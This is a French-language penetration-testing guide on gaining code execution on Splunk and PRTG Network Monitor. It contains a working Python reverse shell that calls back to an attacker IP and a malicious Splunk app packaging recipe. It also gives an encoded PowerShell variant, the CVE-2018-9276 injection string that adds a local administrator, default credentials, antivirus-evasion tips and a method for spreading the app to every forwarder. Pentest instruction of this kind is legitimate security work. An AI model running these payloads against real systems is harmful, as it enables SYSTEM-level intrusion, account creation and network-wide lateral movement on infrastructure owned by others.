# Attaquer Splunk et PRTG

Splunk et PRTG Network Monitor sont deux outils de supervision et de monitoring omnipresents en entreprise. Splunk collecte et analyse les logs (SIEM), PRTG surveille l'infrastructure reseau. Les deux offrent des mecanismes d'execution de code natifs (scripted inputs pour Splunk, notifications pour PRTG) qui deviennent des vecteurs d'attaque des qu'on obtient un acces administrateur.

## Pourquoi

Ces outils tournent avec des privileges eleves pour pouvoir interroger l'ensemble de l'infrastructure. Splunk deploie souvent des Universal Forwarders sur chaque serveur du reseau, ce qui permet de propager une compromission a grande echelle via le deployment server. PRTG tourne en tant que SYSTEM sur Windows. Un RCE sur l'un de ces outils donne un acces privilegie sur un serveur qui a une visibilite complete sur le reseau.

## Comment ca marche

### Splunk

#### Identification

Splunk expose deux ports principaux :
- **Port 8000** : interface web (Splunk Web)
- **Port 8089** : API REST (splunkd)

```bash
# - Identifier Splunk via Nmap
nmap -sV -p 8000,8089 <IP_CIBLE>
```

Les identifiants par defaut sont `admin:changeme`. La version gratuite de Splunk n'impose pas d'authentification par defaut.

{% hint style="warning" %}
La version gratuite de Splunk est parfois deployee en interne comme solution de log "temporaire". Sans authentification, n'importe qui sur le reseau peut acceder a l'interface et deployer du code.
{% endhint %}

#### RCE via application custom

Splunk permet d'installer des applications personnalisees qui executent des scripts au demarrage. Python est disponible sur toutes les installations Splunk, ce qui garantit un environnement d'execution previsible.

**Structure d'une application malveillante :**

```
splunk_shell/
├── bin/
│   └── rev.py          # Script Python (reverse shell)
└── default/
    └── inputs.conf     # Configuration d'execution
```

**inputs.conf :**

```ini
[script://./bin/rev.py]
disabled = 0
interval = 10
sourcetype = splunk_shell
```

**rev.py (Linux) :**

```python
import sys, socket, os, pty
ip = "<IP_ATTAQUANT>"
port = 4443
s = socket.socket()
s.connect((ip, int(port)))
[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)]
pty.spawn('/bin/bash')
```

{% tabs %}
{% tab title="Linux" %}
```bash
# - Packager l'application
tar -cvzf splunk_shell.tar.gz splunk_shell/

# - Deployer via l'interface Splunk
# Apps > Manage Apps > Install app from file > Upload
```
{% endtab %}
{% tab title="Windows" %}
Sur Windows, le script Python peut appeler PowerShell :

```python
import os
os.system("powershell -e <BASE64_PAYLOAD>")
```

Ou utiliser un wrapper batch (`run.bat`) comme point d'entree dans `inputs.conf`.
{% endtab %}
{% endtabs %}

#### Propagation via Universal Forwarders

Si le serveur Splunk compromis est configure comme deployment server, l'application malveillante peut etre propagee automatiquement a tous les Universal Forwarders du reseau. Chaque Forwarder executera le script avec ses propres privileges locaux.

{% hint style="danger" %}
La propagation via deployment server est un vecteur de mouvement lateral massif. En pentest, documenter la possibilite sans l'executer sur tous les Forwarders. Une demonstration sur un seul Forwarder suffit.
{% endhint %}

### PRTG Network Monitor

#### Identification

PRTG expose son interface web sur le port 8080 (parfois 80 ou 443). Le serveur HTTP est identifie comme "Indy httpd" (Paessler).

```bash
# - Identifier PRTG
nmap -sV -p 8080 <IP_CIBLE>
```

Les identifiants par defaut sont `prtgadmin:prtgadmin`.

#### CVE-2018-9276 : injection de commande

Cette vulnerabilite permet d'injecter des commandes OS dans le champ "Parameter" des notifications PRTG. L'exploitation necessite un acces administrateur.

**Exploitation etape par etape :**

1. Se connecter avec les identifiants administrateur
2. Naviguer vers `Setup` > `Account Settings` > `Notifications`
3. Creer une nouvelle notification ou modifier une existante
4. Choisir "Execute Program" comme methode de notification
5. Selectionner `outfile.ps1` comme programme
6. Dans le champ "Parameter", injecter la commande :

```
test.txt;net user pentest Password123! /add;net localgroup administrators pentest /add
```

7. Sauvegarder et declencher la notification (clic sur l'icone de test)

```bash
# - Verifier la creation du compte
crackmapexec smb <IP_CIBLE> -u pentest -p 'Password123!'
```

{% hint style="info" %}
PRTG tourne en tant que `NT AUTHORITY\SYSTEM`. Les commandes injectees s'executent avec ces privileges. La creation d'un compte administrateur local est le moyen le plus fiable de confirmer le RCE.
{% endhint %}

## En pratique

```bash
# Splunk
# 1 - Scanner les ports Splunk
nmap -sV -p 8000,8089 <IP_CIBLE>
# 2 - Tester admin:changeme
# 3 - Creer et deployer une app malveillante (tar.gz)
# 4 - Ecouter : nc -lnvp 4443

# PRTG
# 1 - Scanner le port 8080
nmap -sV -p 8080 <IP_CIBLE>
# 2 - Tester prtgadmin:prtgadmin
# 3 - Exploiter CVE-2018-9276 via les notifications
# 4 - Verifier avec crackmapexec
```

## Pieges et galeres

{% tabs %}
{% tab title="Splunk" %}
- **Version Enterprise vs Free** : la version Enterprise impose l'authentification, la Free non. Verifier la licence affichee dans le footer
- **Inputs.conf interval** : si l'intervalle est trop court (ex: 10 secondes), le script sera execute en boucle. Prevoir un mecanisme de cleanup ou utiliser `interval = 0` pour une execution unique au demarrage
- **Antivirus** : les scripts Python dans les apps Splunk sont parfois detectes. Obfusquer le reverse shell ou utiliser un payload encode
{% endtab %}
{% tab title="PRTG" %}
- **Version patchee** : CVE-2018-9276 est corrige dans les versions recentes. Verifier la version avant de tenter l'exploitation
- **Caracteres speciaux** : le champ Parameter a des limitations sur certains caracteres. Le point-virgule (`;`) fonctionne comme separateur de commandes
- **Notification non declenchee** : la notification doit etre activement declenchee (bouton test ou condition de monitoring remplie). Creer une condition de test simple
{% endtab %}
{% endtabs %}

## Retour terrain

Splunk et PRTG sont des cibles privilegiees en pentest interne. Les identifiants par defaut (`admin:changeme` pour Splunk, `prtgadmin:prtgadmin` pour PRTG) sont trouves regulierement, surtout sur les installations "de test" qui finissent en production.

Splunk est particulierement interessant quand il est configure comme deployment server. Une seule compromission peut donner acces a dizaines de serveurs via les Universal Forwarders. En pratique, on documente cette possibilite dans le rapport sans l'executer a grande echelle.

PRTG sur Windows donne directement un shell SYSTEM. C'est souvent l'un des chemins les plus courts vers un acces Domain Admin quand le serveur PRTG est membre du domaine.

## Memo express

| Technique | Application | Outil / Commande | Prerequis |
|---|---|---|---|
| Fingerprint | Splunk | Ports 8000/8089, Nmap | Reseau |
| Fingerprint | PRTG | Port 8080, "Indy httpd" | Reseau |
| RCE | Splunk | App custom + `rev.py` | Acces admin |
| Propagation | Splunk | Deployment server | Admin + Forwarders |
| RCE | PRTG | CVE-2018-9276 | Acces admin |

***
